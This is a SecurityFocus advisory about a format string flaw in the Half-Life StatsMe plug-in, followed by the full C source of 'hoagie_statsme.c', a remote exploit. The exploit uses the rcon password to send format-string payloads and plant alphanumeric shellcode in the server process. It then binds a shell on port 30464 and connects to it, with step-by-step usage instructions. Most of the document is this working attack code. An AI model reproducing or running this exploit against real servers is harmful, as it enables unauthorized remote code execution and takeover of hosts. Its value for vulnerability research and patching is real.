source: http://www.securityfocus.com/bid/6578/info

The Half-Life StatsMe plug-in is prone to an exploitable format string vulnerability. This issue may be exploited by an attacker who can authenticate with the rcon-password of the Half-Life server to execute arbitrary code in the context of the server process.

Exploitation may be dependant on which other plug-ins are running on the Half-Life server.

Successful exploitation will allow an attacker to gain local and possibly privileged access to the host running the server.

/*****************************************************************
  * hoagie_statsme.c
  *
  * Remote exploit for Halflife-Servers running the StatsMe-Plugin
  * (rcon-password required)
  *
  * Binds a shell to port 30464/tcp and connects to it.
  *
  * Author: greuff@void.at
  *
  * Tested on HL-Server v3.1.1.0 and StatsMe 2.6.19/2.6.16
  *
  * HOW TO USE:
  * *) You have to be logged in on the server, ensure that you
  *    never fired a shot. (this would crash the server)
  * *) In a terminal, or better on another machine, start the
  *    exploit.
  * *) It will ask you about 8 times to execute "/statsme" in HL.
  *    On some servers, you have to enter "/statsme" in the console,
  *    on others you have to "say /statsme", that is configuration
  *    dependant. However, just do it.
  * *) The exploit will connect to the freshly spawned shell.
  *
  * Credits:
  *    void.at for all the nice ppl I know there
  *    rik for his excellent article on alphanumeric shellcodes
  *    Taeho Oh for using parts of his shellcode-connection code.
  *
  * THIS FILE IS FOR STUDYING PURPOSES ONLY AND A PROOF-OF-CONCEPT.
  * THE AUTHOR CAN NOT BE HELD RESPONSIBLE FOR ANY DAMAGE OR
  * CRIMINAL ACTIVITIES DONE BY USING THIS PROGRAM.
  *
  *****************************************************************/

#include <sys/socket.h>
#include <sys/types.h>
#include <sys/time.h>
#include <unistd.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <stdio.h>
#include <errno.h>
#include <string.h>

#define CHECK(a) (((a)>=0x20 && (a)<=0x26)||((a)>=0x2A && (a)<=0x2B)|| \
                   ((a)>=0x2D && (a)<=0x39)||((a)>=0x3B && (a)<=0x7A))

char server_ip[20];
char rcon_pwd[30];
int server_port;

// IMPORTANT choose which statsme-version runs on the target.
// available defines: STATSME_2_6_16, STATSME_2_6_19
// #define STATSME_2_6_19

// 5 shellcodes a 187 chars and final block a 73 chars
char *shellcode[]={"hM3yjX5M3yjHPQPPSRPPaVRWUSFfVNfh7yfXf5txfPDfhFzDSTaAj"
                    "MY0Lka0TkajUY0Lkc0tkc0tkejuY0Lkg0Tkg0tkh0tkjjYX0Dkk0T"
                    "kmjjY0Lkn0tkpjvY0Lkq0TksjsY0Lkt0TkvfhDbfXf1Dkw0Tkyj7X"
                    "0Dkz0tkzC0TkzCjNY0LkzC0TkzCj",

                    "HX0DkzCC0TkzCCCCfhKDfYf1Lkzf1tkzCCCCC0TkzCjGY0LkzCCC0"
                    "tkzCfhiffXf1DkzCC0TkzCjtY0LkzCCCC0tkzCfhjefYf1LkzCC0T"
                    "kzCjPY0Lkz0TkzCCjMY0Lkz0tkzC0TkzCC0TkzCjFY0Lkz0tkzC0T"
                    "kzCjdY0LkzCCC0TkzCfhJlfYf1Lk",

                    "zCCCjXY0Lkz0TkzC0tkzCCfhGUfXf1Dkzf1tkzCCjqX0DkzC0TkzC"
                    "j4X0Dkz0tkzCCjVY0Lkz0tkzCCCC0tkzCfhFqfYf1LkzCC0TkzCjW"
                    "X0DkzC0tkzCC0TkzCj3Y0Lkz0TkzC0TkzCjVY0Lkz0tkzCC0tkzCC"
                    "jMX0Dkz0tkzC0tkzCjHX0DkzC0Tk",

                    "zCjOY0Lkz0TkzCCCjuY0Lkz0TkzC0tkzCjVY0LkzC0tkzCjFY0Lkz"
                    "0tkzCCCjTY0Lkz0TkzC0TkzCjzY0LkzC0tkzCjKY0Lkz0tkzCCjMY"
                    "0Lkz0tkzCCCCjbY0LkzCCCCfhUDfYf1LkzCCCC0TkzCjmX0Dkz0tk"
                    "zC0tkzCCfht9fYf1LkzCCC0tkzCC",

                    "C0TkzCfhKcfYf1LkzCCCjZY0Lkz0tkzC0tkzCj2Y0LkzC0TkzCjOY"
                    "0Lkz0tkzCCjyX0Dkz0tkzC0tkzCjuX0DkzC0tkzCjIX0Dkz0Tkz1r"
                    "1q161XOfLXQNlQNwQNqQrHF2HLLNJ16QQQ4zwfQNEfQreBMdRQPrf"
                    "Avm1rOf29LeSRrFH1gOf8ir2K1iP",

                    "PRrJULROf2Lvj161rOw20A1JOi29A1kOE241iShnMshhzkbivqrTP"
                    "116QSrGG1eO9201FOt26"};

// repair code to circumvent statsme \0a\00-fuck goddamnit it took me 2 days
char reparierer[]="hXXXXhYYYYZhpnTTX5pnTTHQVPPTRPPaRRWWUBRDJfh60DWUaAAAjQY0LoA0ToA0"
                   "ToCf1toEjPY0LoG0toHjGX0DoI0toI0toKjmY0LoL0toLjsY0LoM0"
                   "ToNjIY0LoO0ToQjnY0LoRfhuwfXf1DoTf1toTfhwmfYf1LoWf1ToW"
                   "Z1n16fDDVwAQwK3uuBwTBhpYjchXXXXZBJBJBJBJBJ"; // =211 chars

int exec_sh(int sockfd)
{
         char snd[4096],rcv[4096];
         fd_set rset;
         while(1)
         {
                 FD_ZERO(&rset);
                 FD_SET(fileno(stdin),&rset);
                 FD_SET(sockfd,&rset);
                 select(255,&rset,NULL,NULL,NULL);
                 if(FD_ISSET(fileno(stdin),&rset))
                 {
                         memset(snd,0,sizeof(snd));
                         fgets(snd,sizeof(snd),stdin);
                         write(sockfd,snd,strlen(snd));
                 }
                 if(FD_ISSET(sockfd,&rset))
                 {
                         memset(rcv,0,sizeof(rcv));
                         if(read(sockfd,rcv,sizeof(rcv))<=0)
                                 exit(0);
                         fputs(rcv,stdout);
                 }
         }
}

int connect_sh()
{
         int sockfd,i;
         struct sockaddr_in sin;
         printf("Connect to the shell\n");
         fflush(stdout);
         memset(&sin,0,sizeof(sin));
         sin.sin_family=AF_INET;
         sin.sin_port=htons(30464);
         if(inet_aton(server_ip,&(sin.sin_addr.s_addr))<0) perror("inet_aton"), exit(1);
         if((sockfd=socket(AF_INET,SOCK_STREAM,0))<0)
         {
                 printf("Can't create socket\n");
                 exit(0);
         }
         if(connect(sockfd,(struct sockaddr *)&sin,sizeof(sin))<0)
         {
                 printf("Can't connect to the shell\n");
                 exit(0);
         }
         return sockfd;
}

void create_conn(int *sock, char *host, int port)
{
    struct sockaddr_in sin;
    sin.sin_family=AF_INET;
    sin.sin_port=htons(port);
    if(inet_aton(host,&(sin.sin_addr.s_addr))<0) perror("inet_aton"), exit(1);
    if((*sock=socket(PF_INET,SOCK_DGRAM,0))<0) perror("socket"), exit(1);
}

void lowlevel_rcon(int sock, char *host, int port, char *cmd, char *reply)
{
    char msg[2000];
    struct sockaddr_in sin;
    struct sockaddr_in sfrom;
    fd_set fdset;
    int dummy;

    sin.sin_family=AF_INET;
    sin.sin_port=htons(port);
    if(inet_aton(host,&(sin.sin_addr.s_addr))<0) perror("inet_aton"), exit(1);

    sprintf(msg,"%c%c%c%c%s",0xff,0xff,0xff,0xff,cmd);
    if(sendto(sock,msg,strlen(msg),0,(struct sockaddr *)&sin,sizeof(sin))<0)
       perror("sendto"), exit(1);

    if(reply)
    {
       if(recvfrom(sock,msg,2000,0,(struct sockaddr *)&sfrom,&dummy)<0)
          perror("recvfrom"), exit(1);

       if(strncmp(msg,"\xFF\xFF\xFF\xFF",4))
          fprintf(stderr,"protocol error: reply\n"), exit(1);

       strcpy(reply,msg+4);
    }
}

void send_rcon(int sock, char *host, int port, char *rconpwd, char *cmd, char *reply_fun)
{
    char reply[1000];
    char msg[2000];

    lowlevel_rcon(sock,host,port,"challenge rcon",reply);
    if(!strstr(reply,"challenge rcon "))
       fprintf(stderr,"protocol error\n"), exit(1);
    reply[strlen(reply)-1]=0;

    sprintf(msg,"rcon %s \"%s\" %s",reply+strlen("challenge rcon "),rconpwd,cmd);
    if(reply_fun)
       lowlevel_rcon(sock,host,port,msg,reply);
    else
       lowlevel_rcon(sock,host,port,msg,NULL);
    if(reply_fun)
       strcpy(reply_fun,reply);
}

int main(int argc, char **argv)
{
    int sock, i,j;
    int anzsc;
    int nextoffset;
    char hexcode[20];
    char cmd[100];
    char reply[1000];
    char evil_message[1000];
    unsigned long shellcode_addr=0, szBuffor=0, rep=0;

    if(argc!=4)
    {
       printf("hoagie_statsme - remote exploit for hlds servers using the statsme plugin\n\n");
       printf("Usage: %s server_ip server_port rcon_password\n\n",argv[0]);
       exit(1);
    }

    strcpy(server_ip,argv[1]);
    server_port=strtol(argv[2],NULL,10);
    strcpy(rcon_pwd,argv[3]);

    create_conn(&sock,server_ip,server_port);

    // check if exploitable
#ifdef STATSME_2_6_19
    send_rcon(sock,server_ip,server_port,rcon_pwd,"sm_playerstats %+e%+e%+e%+e%+e%x...0x%08x",reply);
#else
#ifdef STATSME_2_6_16
    send_rcon(sock,server_ip,server_port,rcon_pwd,"sm_playerstats %+e%+e%+e%+e%+e%+e%+e%+e%+e%x...0x%08x",reply);
#else
#error No statsme-version defined! look into the source file.
#endif
#endif
    if(strlen(reply)==1) printf("< empty reply ... OK >\n");
    else printf("oversized reply: %s, exiting\n",reply), exit(1);

    printf("now activate /statsme in CS. The window will contain a lot of \n"
           "garbage followed by a hex code like 0x434050e9. Please enter \n"
           "this hexcode now: ");
    fgets(hexcode,20,stdin);
    hexcode[strlen(hexcode)-1]=0;
    if(strlen(hexcode)!=10 || hexcode[0]!='0' || hexcode[1]!='x')
       printf("invalid hexcode format.\n"), exit(1);

    szBuffor=strtoul(hexcode,NULL,16);
    shellcode_addr=szBuffor+0x200;    // will be default offset

    if(!CHECK(shellcode_addr>>24) || !CHECK((shellcode_addr>>16)&0xFF) ||
       !CHECK((shellcode_addr>>8)&0xFF))
    {
       printf("sorry, not exploitable yet. Try later.\n");
       exit(1);
    }
    printf("\nAlright, this server is exploitable :-))\n\n");

    // 1) fuzzy alignment, needed to ensure all addresses used are ASCII
    shellcode_addr&=0xFFFFFF00;
    shellcode_addr|=0x6A;

    printf("Using shellcode address 0x%08x\n",shellcode_addr);

    anzsc=5;
    while(anzsc>=-1)
    {
       memset(evil_message,0,1000);
       if(anzsc==-1)
       {
          // special case, create bootstrap loader
          nextoffset=shellcode_addr-szBuffor;
          printf("Creating bootstrap loader at offset %d\n",nextoffset);

          rep=shellcode_addr+strlen(reparierer);   // should be ASCII-safe because of 1)
          sprintf(cmd,"h%c%c%c%ch%c%c%c%cZ",rep&0xFF,(rep>>8)&0xFF,(rep>>16)&0xFF,
                  (rep>>24)&0xFF,(shellcode_addr+11)&0xFF,((shellcode_addr+11)>>8)&0xFF,
                  ((shellcode_addr+11)>>16)&0xFF,((shellcode_addr+11)>>24)&0xFF);
          strncpy(reparierer,cmd,11);
          sprintf(cmd,"h%c%c%c%cZ",rep&0xFF,(rep>>8)&0xFF,(rep>>16)&0xFF,
                  (rep>>24)&0xFF);
          strncpy(strstr(reparierer,"hXXXXZ"),cmd,5);
          sprintf(evil_message,"sm_playerstats %%.%du%s",nextoffset,reparierer);
       }
       else
       {
          // write next part of the shellcode
          nextoffset=(shellcode_addr-szBuffor)+
                     strlen(reparierer)+2+anzsc*(187+2);
          printf("Writing shellcode fragment #%d at offset %d\n",anzsc,nextoffset);

          sprintf(evil_message,"sm_playerstats %%.%du%s",nextoffset,shellcode[anzsc]);
       }

       // send evil package
       // printf("Sending '%s'...\n",evil_message);
       send_rcon(sock,server_ip,server_port,rcon_pwd,evil_message,reply);
       if(strlen(reply)==1) printf("< empty reply ... OK >\n");
       else printf("oversized reply: %s, exiting\n",reply), exit(1);

       printf("activate /statsme in CS and then press ENTER...");
       fgets(cmd,100,stdin);
       anzsc--;
    }

    printf("Executing shellcode...\n");

    strcpy(evil_message,"sm_register ");
    sprintf(cmd,"%c%c%c%c",(shellcode_addr&0xFF),(shellcode_addr>>8)&0xFF,
        (shellcode_addr>>16)&0xFF,(shellcode_addr>>24)&0xFF);
    for(i=0;i<20;i++)
       strcat(evil_message,cmd);
    strcat(evil_message," 1 1");
    send_rcon(sock,server_ip,server_port,rcon_pwd,evil_message,NULL);
    printf("Shell should run now. Wait a few ticks, then press ENTER.\n");
    fgets(cmd,100,stdin);
    close(sock);
    exec_sh(connect_sh());
    return 0;
}

